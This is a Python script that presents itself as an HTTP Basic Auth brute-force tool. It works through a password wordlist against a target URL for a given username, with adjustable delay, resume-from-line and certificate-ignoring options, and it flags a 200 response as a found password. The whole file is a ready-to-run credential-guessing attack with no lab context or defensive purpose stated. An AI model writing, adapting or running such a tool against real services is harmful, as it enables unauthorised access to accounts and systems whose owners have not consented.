#!/usr/bin/env python

from time import sleep
import httplib2
import sys
import argparse
import signal
import os
from urllib.parse import urlparse


# Print the current line on when terminated via ctrl-c
def signal_handler(signal, frame):
    print('Stopped at line: ' + str(currentLine))
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# PARSING ARGS

parser = argparse.ArgumentParser(description='HTTP Auth Brute Force Tool')
parser.add_argument('Target', metavar='target', type=str, help='The target URI. ex http://192.168.1.1')
parser.add_argument('Wordlist', metavar='words', type=str, help='The wordlist to choose passwords from')
parser.add_argument('Username', metavar='user', type=str, help='The username to use')
parser.add_argument("--delay", type=int, help='Time in milliseconds between each request', default=5)
parser.add_argument("--startat", type=int, help='Start at this line in the file', default=0)
parser.add_argument("--ignore-consecutive-empty", type=int, help='Ignore this many consec. empty lines before exiting',
                    default=4)
parser.add_argument("--ignore-invalid-certificate", type=bool, help='Ignore untrusted certs', default=True)

args = parser.parse_args()

# Input validation
def validate_inputs():
    """Validate command line arguments and input files"""
    # Validate target URL
    try:
        parsed_url = urlparse(args.Target)
        if not parsed_url.scheme or not parsed_url.netloc:
            print("Error: Invalid target URL format. Must include scheme (http:// or https://)")
            sys.exit(1)
    except Exception as e:
        print(f"Error: Invalid target URL: {e}")
        sys.exit(1)
    
    # Validate wordlist file exists and is readable
    if not os.path.isfile(args.Wordlist):
        print(f"Error: Wordlist file '{args.Wordlist}' not found")
        sys.exit(1)
    
    try:
        with open(args.Wordlist, 'r') as f:
            f.readline()  # Test if file is readable
    except Exception as e:
        print(f"Error: Cannot read wordlist file '{args.Wordlist}': {e}")
        sys.exit(1)
    
    # Validate delay
    if args.delay < 0:
        print("Error: Delay must be non-negative")
        sys.exit(1)
    
    # Validate startat
    if args.startat < 0:
        print("Error: Start line must be non-negative")
        sys.exit(1)

validate_inputs()
# END ARGS

# GLOBAL VARS
delay = args.delay
target = args.Target
username = args.Username
wordlist = args.Wordlist
startAt = args.startat
count = 0
maxEmptyCount = args.ignore_consecutive_empty
currentLine = 0
ignoreBadCerts = args.ignore_invalid_certificate
# END VARS

print(f"Starting HTTP Basic Auth brute force against: {target}")
print(f"Username: {username}")
print(f"Wordlist: {wordlist}")
print(f"Delay: {delay}ms between requests")
if startAt > 0:
    print(f"Starting at line: {startAt}")
print("-" * 50)

try:
    with open(wordlist, "r") as f:
        pwd = f.readline().strip('\n')
        if startAt > 0:
            print(f"Skipping: {startAt} lines")
            while count < startAt and pwd:
                pwd = f.readline().rstrip('\n')
                count += 1
                currentLine += 1
        
        while pwd:
            currentLine += 1
            emptyCount = 0
            
            # Only print password if it's not empty (avoid logging blank attempts)
            if pwd.strip():
                print(f"Trying: {username}:[REDACTED] (line {currentLine})")
            
            try:
                http = httplib2.Http()
                http.disable_ssl_certificate_validation = ignoreBadCerts
                http.add_credentials(username, pwd)
                res, content = http.request(target)
                
                print(f"Response: {res.status}")
                
                if res.status == 200:
                    print(f"\n[SUCCESS] Authentication successful!")
                    print(f"Username: {username}")
                    print(f"Password found at line: {currentLine}")
                    sys.exit(0)
                elif res.status == 401:
                    print("Authentication failed (401 Unauthorized)")
                elif res.status == 403:
                    print("Access forbidden (403) - credentials may be valid but access denied")
                else:
                    print(f"Unexpected response: {res.status}")
                    
            except httplib2.error.ServerNotFoundError as e:
                print(f"Error: Server not found - {e}")
                sys.exit(1)
            except Exception as e:
                print(f"Error during request: {e}")
                print("Continuing with next password...")
            
            pwd = f.readline().rstrip('\n')
            
            # Handle consecutive empty lines
            while not pwd:
                emptyCount += 1
                if emptyCount > maxEmptyCount:
                    print(f"\nReached {maxEmptyCount} consecutive empty lines. Ending scan.")
                    sys.exit(0)
                pwd = f.readline().rstrip('\n')
                if not pwd and f.tell() == os.fstat(f.fileno()).st_size:
                    # Reached end of file
                    break
            
            # Apply delay between requests
            if delay > 0:
                sleep(delay / 1000.0)
    
    print(f"\nScan completed. Tried {currentLine} passwords.")
    print("No valid credentials found.")

except FileNotFoundError:
    print(f"Error: Wordlist file '{wordlist}' not found")
    sys.exit(1)
except KeyboardInterrupt:
    print(f"\nScan interrupted by user at line {currentLine}")
    sys.exit(0)
except Exception as e:
    print(f"Unexpected error: {e}")
    sys.exit(1)



